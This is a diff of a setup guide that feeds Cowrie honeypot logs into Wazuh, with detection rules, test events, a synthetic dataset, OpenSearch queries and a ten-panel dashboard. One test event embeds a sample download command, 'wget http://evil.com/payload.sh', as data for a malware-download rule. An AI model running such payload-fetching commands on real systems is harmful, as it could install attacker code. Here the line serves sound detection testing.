@@ -3,11 +3,11 @@
 | Field | Value |
 | --- | --- |
 | **OS** | Ubuntu 24.04 LTS (bare metal) |
-| **Wazuh** | v4.14.3 - all-in-one (manager + indexer + dashboard) |
+| **Wazuh** | v4.14.x - all-in-one (manager + indexer + dashboard) |
 | **Cowrie** | Docker image `cowrie/cowrie:latest` |
-| **Validated** | 2026-03-14 |
+| **Validated** | 2026-06-12 |
 | **Log Format** | JSON (`cowrie.json`) |
-| **Documentation Version** | 1.0 |
+| **Documentation Version** | 2.0 |
 
 ---
 
@@ -19,11 +19,12 @@
 4. [Wazuh Configuration](#4-wazuh-configuration)
 5. [Cowrie Rules - `cowrie_rules.xml`](#5-cowrie-rules---cowrie_rulesxml)
 6. [Validation](#6-validation)
-7. [OpenSearch Verification](#7-opensearch-verification)
-8. [Dashboard Visualizations](#8-dashboard-visualizations)
-9. [Technical Challenges and Fixes](#9-technical-challenges-and-fixes)
-10. [Reproduction Workflow](#10-reproduction-workflow)
-11. [Operational Notes](#11-operational-notes)
+7. [Synthetic Dataset Generation](#7-synthetic-dataset-generation)
+8. [OpenSearch Verification](#8-opensearch-verification)
+9. [Dashboard Visualizations](#9-dashboard-visualizations)
+10. [Technical Challenges and Fixes](#10-technical-challenges-and-fixes)
+11. [Reproduction Workflow](#11-reproduction-workflow)
+12. [Operational Notes](#12-operational-notes)
 
 ---
 
@@ -37,7 +38,7 @@ The workflow follows this model:
 Cowrie JSON log -> Wazuh logcollector -> built-in JSON decoder -> custom Cowrie rules -> OpenSearch -> Wazuh Dashboard
 ```
 
-The ruleset covers eight operational event categories plus one base rule, with emphasis on brute-force attempts, successful compromise of the honeypot, command execution, malware download attempts, and reconnaissance.
+The ruleset covers eight operational event categories plus one base rule, with emphasis on brute-force attempts, successful compromise of the honeypot, command execution, malware download attempts, and reconnaissance. The dashboard comprises ten panels covering alert volume, event types, malware downloads, rule distribution, severity, source IPs, commands, authentication outcomes, MITRE mapping, and detailed alert inspection.
 
 ---
 
@@ -48,18 +49,18 @@ The ruleset covers eight operational event categories plus one base rule, with e
 | Component | Details |
 | --- | --- |
 | Host OS | Ubuntu 24.04 LTS |
-| Wazuh Version | 4.14.3 |
+| Wazuh Version | 4.14.x |
 | OpenSearch | `https://127.0.0.1:9200` |
 | Wazuh Dashboard | HTTPS on the lab dashboard endpoint |
 | Cowrie Runtime | Docker |
 | Container Image | `cowrie/cowrie:latest` |
-| Cowrie SSH Port | Host `2224` -> container `2222` |
-| Cowrie Telnet Port | Host `2225` -> container `2223` |
+| Cowrie SSH Port | Host `55222` -> container `2222` |
+| Cowrie Telnet Port | Host `55223` -> container `2223` |
 | Container Hostname | `svr04` |
 
 ### 2.2 Network Note
 
-In the captured lab sessions, the observed source IP is the Docker bridge address. That is expected when the honeypot is accessed locally through Docker bridge networking. In an Internet-exposed deployment, source IP diversity would be higher.
+The host public IPv4 port 22 is used by MITRE Caldera, so the Cowrie honeypot uses high ports (`55222` for SSH and `55223` for Telnet). In the captured lab sessions, the observed source IP is the Docker bridge address. That is expected when the honeypot is accessed locally through Docker bridge networking. In an Internet-exposed deployment, source IP diversity would be higher.
 
 ---
 
@@ -275,15 +276,15 @@ Use `wazuh-logtest` with raw JSON piped directly into the tool. The goal is to c
 Examples:
 
 ```bash
-echo '{"eventid":"cowrie.login.success","username":"root","src_ip":"172.17.0.1","session":"test01","protocol":"ssh","timestamp":"2026-03-14T07:00:00Z"}' \
+echo '{"eventid":"cowrie.login.success","username":"root","src_ip":"172.17.0.1","session":"test01","protocol":"ssh","timestamp":"2026-06-12T07:00:00Z"}' \
 | sudo /var/ossec/bin/wazuh-logtest 2>&1 | grep -v WARNING
 
 
-echo '{"eventid":"cowrie.login.failed","username":"admin","src_ip":"172.17.0.1","session":"test02","protocol":"ssh","timestamp":"2026-03-14T07:05:00Z"}' \
+echo '{"eventid":"cowrie.login.failed","username":"admin","src_ip":"172.17.0.1","session":"test02","protocol":"ssh","timestamp":"2026-06-12T07:05:00Z"}' \
 | sudo /var/ossec/bin/wazuh-logtest 2>&1 | grep -v WARNING
 
 
-echo '{"eventid":"cowrie.command.input","input":"wget http://evil.com/payload.sh","src_ip":"172.17.0.1","session":"test03","protocol":"ssh","timestamp":"2026-03-14T07:10:00Z"}' \
+echo '{"eventid":"cowrie.command.input","input":"wget http://evil.com/payload.sh","src_ip":"172.17.0.1","session":"test03","protocol":"ssh","timestamp":"2026-06-12T07:10:00Z"}' \
 | sudo /var/ossec/bin/wazuh-logtest 2>&1 | grep -v WARNING
 ```
 
@@ -304,7 +305,7 @@ Expected results:
 Generate realistic honeypot traffic directly against Cowrie:
 
 ```bash
-ssh -p 2224 -o StrictHostKeyChecking=no root@localhost
+ssh -p 55222 -o StrictHostKeyChecking=no root@localhost
 # Example commands once inside Cowrie shell:
 # whoami
 # id
@@ -327,11 +328,63 @@ shutil.copy('/cowrie/cowrie-git/etc/userdb.example', '/cowrie/cowrie-git/etc/use
 
 ---
 
-## 7. OpenSearch Verification
+## 7. Synthetic Dataset Generation
+
+To produce realistic data for dashboards without waiting for organic attack traffic, a synthetic dataset was generated and appended to the Cowrie log using a Python script.
+
+### 7.1 Dataset Composition
+
+The dataset contains **145 JSON events** distributed across the following event types:
+
+| Event Type | Count | Rule Triggered |
+| --- | ---: | --- |
+| `cowrie.session.connect` | 20 | 100501 |
+| `cowrie.login.failed` | 30 | 100502 |
+| `cowrie.login.success` | 8 | 100503 |
+| `cowrie.command.input` (normal commands) | 35 | 100504 |
+| `cowrie.command.input` (malware download) | 20 | 100505 |
+| `cowrie.command.failed` | 12 | 100506 |
+| `cowrie.session.closed` | 10 | 100507 |
+| `cowrie.client.version` | 10 | 100508 |
+| **Total** | **145** | |
+
+### 7.2 Dataset Key for Filtering
+
+Each synthetic event includes a `dataset` field with a unique identifier (e.g., `cowrie_synthetic_20260611_220053`). This allows precise filtering in the Wazuh Dashboard using DQL:
+
+```text
+rule.groups: "cowrie" and data.dataset: "cowrie_synthetic_20260611_220053"
+```
+
+### 7.3 Realistic Field Values
+
+The synthetic events include randomized values for fields such as `src_ip` (multiple attacker IPs across different subnets: `192.168.1.x`, `198.51.100.x`, `203.0.113.x`, `172.17.0.x`, `10.10.10.x`), `username` (common brute-force targets: root, admin, pi, ubuntu, oracle, support), `input` (reconnaissance commands like `whoami`, `id`, `uname -a`, `cat /etc/passwd`, `ls -la`, `ps aux`, plus malware download commands using `wget`, `curl`, `tftp`, `ftpget`), and `session` (unique session IDs per event).
+
+---
+
+## 8. OpenSearch Verification
 
 Use Dev Tools to confirm that Cowrie alerts are indexed with extracted JSON fields.
 
-### 7.1 Count alerts with structured fields
+### 8.1 Count alerts for the synthetic dataset
+
+```json
+GET wazuh-alerts-*/_count
+{
+  "query": {
+    "bool": {
+      "filter": [
+        {"term": {"data.dataset": "cowrie_synthetic_20260611_220053"}},
+        {"term": {"rule.groups": "cowrie"}}
+      ]
+    }
+  }
+}
+```
+
+Expected response: count of **145** documents.
+
+### 8.2 Count alerts with structured fields
 
 ```json
 GET wazuh-alerts-*/_search
@@ -355,7 +408,7 @@ GET wazuh-alerts-*/_search
 }
 ```
 
-### 7.2 Distribution by rule, username, eventid, and source IP
+### 8.3 Distribution by rule, username, eventid, and source IP
 
 ```json
 GET wazuh-alerts-*/_search
@@ -363,22 +416,30 @@ GET wazuh-alerts-*/_search
   "size": 0,
   "query": {
     "bool": {
-      "must": [
-        {"match": {"rule.groups": "cowrie"}},
-        {"exists": {"field": "data.eventid"}}
+      "filter": [
+        {"term": {"data.dataset": "cowrie_synthetic_20260611_220053"}},
+        {"term": {"rule.groups": "cowrie"}}
       ]
     }
   },
   "aggs": {
-    "by_rule": {"terms": {"field": "rule.id", "size": 20}},
-    "by_username": {"terms": {"field": "data.username", "size": 20}},
-    "by_eventid": {"terms": {"field": "data.eventid", "size": 20}},
-    "by_srcip": {"terms": {"field": "data.src_ip", "size": 20}}
+    "cowrie_rules": {
+      "terms": {"field": "rule.id", "size": 20, "order": {"_count": "desc"}}
+    },
+    "by_username": {
+      "terms": {"field": "data.username", "size": 20}
+    },
+    "by_eventid": {
+      "terms": {"field": "data.eventid", "size": 20}
+    },
+    "by_srcip": {
+      "terms": {"field": "data.src_ip", "size": 20}
+    }
   }
 }
 ```
 
-### 7.3 MITRE ATT&CK breakdown
+### 8.4 MITRE ATT&CK breakdown
 
 ```json
 GET wazuh-alerts-*/_search
@@ -396,7 +457,7 @@ GET wazuh-alerts-*/_search
 }
 ```
 
-### 7.4 Critical alerts
+### 8.5 Critical alerts
 
 ```json
 GET wazuh-alerts-*/_search
@@ -416,64 +477,155 @@ GET wazuh-alerts-*/_search
 }
 ```
 
+### 8.6 Field Mapping Verification
+
+A query to `_mapping` confirmed that `data.src_ip`, `data.username`, `data.input`, and `data.eventid` are mapped as keywords, allowing direct use in terms aggregations without the `.keyword` suffix.
+
 ---
 
-## 8. Dashboard Visualizations
+## 9. Dashboard Visualizations
 
 Use the Wazuh Dashboard / OpenSearch Dashboards interface with the `wazuh-alerts-*` index pattern.
 
-### Visualization 1 - Honeypot Event Distribution
+**Global DQL filter for the synthetic dataset:**
 
-**Type:** Pie / Donut  
-**Title:** `Cowrie: Honeypot Event Distribution`
+```text
+rule.groups: "cowrie" and data.dataset: "cowrie_synthetic_20260611_220053"
+```
+
+The dashboard comprises **ten panels** organized across five rows.
+
+---
+
+### Panel 1 - Alert Volume Timeline Bar
+
+**Type:** Vertical Bar
+**Title:** `Cowrie: Alert Volume Timeline Bar`
 
 - Filter: `rule.groups is cowrie`
-- Filter: `data.eventid exists`
+- Metric: `Count`
+- X-axis: `Date Histogram` on `timestamp`
+- Note: With the synthetic dataset, events appear as a single bar because they were ingested at nearly the same time. With organic traffic, the timeline shows temporal distribution of attacks.
+
+![Cowrie Alert Volume Timeline Bar](assets/cowrie/01-cowrie-alert-volume-timeline-bar.png)
+
+---
+
+### Panel 2 - Honeypot Event Types
+
+**Type:** Pie / Donut
+**Title:** `Cowrie: Honeypot Event Types`
+
+- Filter: `rule.groups is cowrie`
 - Metric: `Count`
 - Split slices: `Terms` on `data.eventid`
 - Order: `Count desc`
 - Size: `15`
+- Shows relative frequency of `command.input` (37.93%), `login.failed` (20.69%), `session.connect` (13.79%), `command.failed` (8.28%), `client.version` (6.9%), `session.closed` (6.9%), and `login.success` (5.52%).
 
-![Cowrie Honeypot Event Distribution](assets/cowrie/cowrie-event-distribution.png)
+![Cowrie Honeypot Event Types](assets/cowrie/02-cowrie-honeypot-event-types.png)
 
 ---
 
-### Visualization 2 - Alerts by Rule
+### Panel 3 - Malware Download Attempts by Tool
 
-**Type:** Horizontal Bar  
-**Title:** `Cowrie: Alerts by Rule`
+**Type:** Horizontal Bar
+**Title:** `Cowrie: Malware Download Attempts by Tool`
 
-- Filter: `rule.groups is cowrie`
-- Filter: `data.eventid exists`
+- Filter: `rule.groups is cowrie` AND `rule.id is 100505`
 - Metric: `Count`
-- X-axis: `Terms` on `rule.description`
+- Y-axis: `Terms` on `data.input`
 - Order: `Count desc`
 - Size: `10`
+- Maps to MITRE T1105 (Ingress Tool Transfer). Shows distribution across `curl`, `ftpget`, `wget`, and `tftp` download commands.
 
-![Cowrie Alerts by Rule](assets/cowrie/cowrie-alerts-by-rule.png)
+![Cowrie Malware Download Attempts by Tool](assets/cowrie/03-cowrie-malware-download-attempts-by-tool.png)
 
 ---
 
-### Visualization 3 - Attacked Usernames
+### Panel 4 - Alerts by Rule ID
 
-**Type:** Pie  
-**Title:** `Cowrie: Attacked Usernames`
+**Type:** Horizontal Bar
+**Title:** `Cowrie: Alerts by Rule ID`
 
 - Filter: `rule.groups is cowrie`
-- Filter: `data.username exists`
 - Metric: `Count`
-- Split slices: `Terms` on `data.username`
+- Y-axis: `Terms` on `rule.id`
 - Order: `Count desc`
 - Size: `10`
+- Confirms rules 100501-100508 triggered as expected, with rule 100504 (command input) generating the highest volume.
 
-![Cowrie Attacked Usernames](assets/cowrie/cowrie-usernames-attacked.png)
+![Cowrie Alerts by Rule ID](assets/cowrie/04-cowrie-alerts-by-rule-id.png)
 
 ---
 
-### Visualization 4 - MITRE ATT&CK Techniques
+### Panel 5 - Alert Severity Levels by Rule
 
-**Type:** Pie  
-**Title:** `Cowrie: MITRE ATT&CK Techniques`
+**Type:** Vertical Bar
+**Title:** `Cowrie: Alert Severity Levels by Rule`
+
+- Filter: `rule.groups is cowrie`
+- Y-axis: `Count`
+- X-axis: `Histogram` on `rule.level`
+- Minimum interval: `1`
+- Shows distribution across severity levels: 3 (session events), 5 (command failed), 6 (connections, client version), 8 (login failed), 10 (command execution), 12 (login success), and 14 (malware downloads).
+
+![Cowrie Alert Severity Levels by Rule](assets/cowrie/05-cowrie-alert-severity-levels-by-rule.png)
+
+---
+
+### Panel 6 - Top Source IPs
+
+**Type:** Horizontal Bar
+**Title:** `Cowrie: Top Source IPs`
+
+- Filter: `rule.groups is cowrie`
+- Metric: `Count`
+- Y-axis: `Terms` on `data.src_ip`
+- Order: `Count desc`
+- Size: `10`
+- Identifies the most active attacking hosts. In the synthetic dataset, IPs span multiple subnets (`192.168.1.x`, `203.0.113.x`, `198.51.100.x`, `10.10.10.x`, `172.17.0.x`). With port forwarding to the Internet, this panel shows real external attacker IPs.
+
+![Cowrie Top Source IPs](assets/cowrie/06-cowrie-top-source-ips.png)
+
+---
+
+### Panel 7 - Top Commands Executed
+
+**Type:** Horizontal Bar
+**Title:** `Cowrie: Top Commands Executed`
+
+- Filter: `rule.groups is cowrie`
+- Filter: `data.input exists`
+- Metric: `Count`
+- Y-axis: `Terms` on `data.input`
+- Order: `Count desc`
+- Size: `20`
+- Shows the full command landscape including reconnaissance commands (`cat /etc/passwd`, `ip a`, `whoami`, `uname -a`, `id`, `ls -la`, `ps aux`, `netstat -tulpen`), malware downloads (`curl`, `wget`, `tftp`, `ftpget`), privilege escalation tools (`linpeas`, `getsystem`), and scanning tools (`masscan_local`, `scanner`).
+
+![Cowrie Top Commands Executed](assets/cowrie/07-cowrie-top-commands-executed.png)
+
+---
+
+### Panel 8 - Authentication Outcomes
+
+**Type:** Pie / Donut
+**Title:** `Cowrie: Authentication Outcomes`
+
+- Filter: `rule.groups is cowrie`
+- Filter: `rule.id is 100502 OR rule.id is 100503`
+- Metric: `Count`
+- Split slices: `Terms` on `rule.description`
+- Shows the ratio of failed login attempts (78.95%) vs successful logins (21.05%). In a real deployment, a high success rate would indicate weak honeypot credentials or a targeted attack.
+
+![Cowrie Authentication Outcomes](assets/cowrie/08-cowrie-authentication-outcomes.png)
+
+---
+
+### Panel 9 - MITRE ATT&CK Techniques by Rule
+
+**Type:** Pie / Donut
+**Title:** `Cowrie: MITRE ATT&CK Techniques by Rule`
 
 - Filter: `rule.groups is cowrie`
 - Filter: `rule.mitre.id exists`
@@ -481,108 +633,52 @@ Use the Wazuh Dashboard / OpenSearch Dashboards interface with the `wazuh-alerts
 - Split slices: `Terms` on `rule.mitre.id`
 - Order: `Count desc`
 - Size: `10`
+- Distribution: T1110.001 (Password Guessing, 30.89%), T1059 (Command and Scripting Interpreter, 28.46%), T1105 (Ingress Tool Transfer, 16.26%), T1110 (Brute Force, 16.26%), T1046 (Network Service Discovery, 8.13%).
 
-![Cowrie MITRE ATT&CK Techniques](assets/cowrie/cowrie-mitre-techniques.png)
-
----
-
-### Visualization 5 - Alert Severity Distribution
-
-**Type:** Vertical Bar  
-**Title:** `Cowrie: Alert Severity Distribution`
-
-- Filter: `rule.groups is cowrie`
-- Filter: `data.eventid exists`
-- Y-axis: `Count`
-- X-axis: `Histogram` on `rule.level`
-- Minimum interval: `1`
-
-![Cowrie Alert Severity Distribution](assets/cowrie/cowrie-alert-severity-distribution.png)
+![Cowrie MITRE ATT&CK Techniques by Rule](assets/cowrie/09-cowrie-mitre-attack-techniques-by-rule.png)
 
 ---
 
-### Visualization 6 - Honeypot Activity Timeline
+### Panel 10 - Recent Alert Details (Discover)
 
-**Type:** Line  
-**Title:** `Cowrie: Honeypot Activity Timeline`
+**Type:** Discover saved search
+**Title:** `Cowrie: Recent Alert Details Discover`
 
-- Filter: `rule.groups is cowrie`
-- Y-axis: `Count`
-- X-axis: `Date Histogram` on `timestamp`
-- Minimum interval: `Minute` or `Auto`
+Saved search in Discover with the following selected fields:
 
-Use the dashboard time picker to match the real test window.
+- `timestamp`
+- `rule.id`
+- `rule.level`
+- `rule.description`
+- `data.eventid`
+- `data.src_ip`
+- `data.username`
+- `data.input`
+- `data.session`
+- `data.protocol`
 
-![Cowrie Honeypot Activity Timeline](assets/cowrie/cowrie-activity-timeline.png)
-
----
-
-### Visualization 7 - Recent Alert Details
-
-**Type:** Data Table  
-**Title:** `Cowrie: Recent Alert Details`
-
-Filters:
-
-- `rule.groups is cowrie`
-- `data.eventid exists`
-
-Split rows:
-
-1. `timestamp`
-2. `rule.description`
-3. `rule.level`
-4. `data.eventid`
-5. `data.username`
-6. `data.src_ip`
-
-![Cowrie Recent Alert Details](assets/cowrie/cowrie-alert-details.png)
+![Cowrie Recent Alert Details Discover](assets/cowrie/10-cowrie-recent-alert-details-discover.png)
 
 ---
 
-### Visualization 8 - MITRE ATT&CK Tactics
+### Dashboard Layout
 
-**Type:** Horizontal Bar  
-**Title:** `Cowrie: MITRE ATT&CK Tactics`
-
-- Filter: `rule.groups is cowrie`
-- Filter: `rule.mitre.tactic exists`
-- Metric: `Count`
-- X-axis: `Terms` on `rule.mitre.tactic`
-- Order: `Count desc`
-- Size: `10`
-
-![Cowrie MITRE ATT&CK Tactics](assets/cowrie/cowrie-mitre-tactics.png)
-
----
-
-### Full Dashboard Screenshot
-
-Title suggestion:
-
-`Cowrie Honeypot - SOC Monitoring`
+**Title:** `Cowrie Honeypot - SOC Monitoring`
 
 Recommended layout:
 
-- Row 1: timeline full width
-- Row 2: event distribution + severity distribution
-- Row 3: attacked usernames + MITRE techniques
-- Row 4: alerts by rule + MITRE tactics
-- Row 5: recent alert details full width
-
-
----
-
-### Dev Tools Verification Screenshot
-
-Include at least one screenshot showing successful OpenSearch aggregation on Cowrie fields.
-
+- Row 1: Alert Volume Timeline Bar (full width)
+- Row 2: Honeypot Event Types + Malware Download Attempts by Tool
+- Row 3: Alerts by Rule ID + Alert Severity Levels by Rule
+- Row 4: Top Source IPs + Top Commands Executed
+- Row 5: Authentication Outcomes + MITRE ATT&CK Techniques by Rule
+- Row 6: Recent Alert Details Discover (full width)
 
 ---
 
-## 9. Technical Challenges and Fixes
+## 10. Technical Challenges and Fixes
 
-### 9.1 `wazuh-logtest` JSON Limitation
+### 10.1 `wazuh-logtest` JSON Limitation
 
 Problem:
 
@@ -592,7 +688,7 @@ Fix:
 
 Use `<match>` on the raw JSON string instead of `<field>` conditions for Cowrie rules.
 
-### 9.2 OS_Match Backslash Pitfall
+### 10.2 OS_Match Backslash Pitfall
 
 Problem:
 
@@ -612,7 +708,7 @@ not:
 <match>"eventid":"cowrie\.</match>
 ```
 
-### 9.3 JSON Field Destruction with `<parent>json</parent>`
+### 10.3 JSON Field Destruction with `<parent>json</parent>`
 
 Problem:
 
@@ -622,9 +718,19 @@ Fix:
 
 Remove those child decoders and rely on the built-in JSON decoder plus `<decoded_as>json</decoded_as>` in rules.
 
+### 10.4 Docker Volume Log Path
+
+Problem:
+
+Cowrie writes the active `cowrie.json` to an anonymous Docker volume, not to the bind-mounted directory that may appear empty on the host.
+
+Fix:
+
+Use `docker inspect` and `find` to locate the real file path inside `/var/lib/docker/volumes/`, then create a stable symlink at `/var/log/cowrie.json`.
+
 ---
 
-## 10. Reproduction Workflow
+## 11. Reproduction Workflow
 
 1. Locate the real `cowrie.json` file inside Docker storage.
 2. Create `/var/log/cowrie.json` as a symlink.
@@ -633,19 +739,21 @@ Remove those child decoders and rely on the built-in JSON decoder plus `<decoded
 5. Create `/var/ossec/etc/rules/cowrie_rules.xml`.
 6. Validate with `wazuh-analysisd -t` and restart the manager.
 7. Run `wazuh-logtest` with representative JSON events.
-8. Generate real SSH/Telnet activity against Cowrie.
-9. Verify structured `data.*` fields in `alerts.json` and OpenSearch.
-10. Build the dashboard and capture screenshots.
+8. Generate real SSH/Telnet activity against Cowrie on port `55222`.
+9. Optionally generate a synthetic dataset for dashboard validation.
+10. Verify structured `data.*` fields in `alerts.json` and OpenSearch.
+11. Build the ten-panel dashboard and capture screenshots.
 
 ---
 
-## 11. Operational Notes
+## 12. Operational Notes
 
 - The Docker bridge IP appearing in Cowrie alerts is normal in a local lab.
 - Alerts generated before the JSON field fix may not contain structured `data.*` fields.
-- For GitHub publication, replace the placeholder screenshots in `assets/` with clean, high-resolution captures from the Wazuh Dashboard.
+- Port `55222` (SSH) and `55223` (Telnet) are used because the host public port 22 is allocated to MITRE Caldera.
+- The synthetic dataset approach allows reproducible dashboard validation without depending on external attacker traffic. Use the `data.dataset` field to filter synthetic events from organic traffic.
 - Keep all publication text in English for consistency with the rest of the repository.
 
 ---
 
-*Prepared for publication in the Wazuh SOC Enterprise repository. Replace the placeholder screenshots in `assets/` with final high-resolution images before committing to Git.*
+*Cowrie Honeypot integration — v2.0 — Validated 2026-06-12 — Wazuh SOC Enterprise repository.*
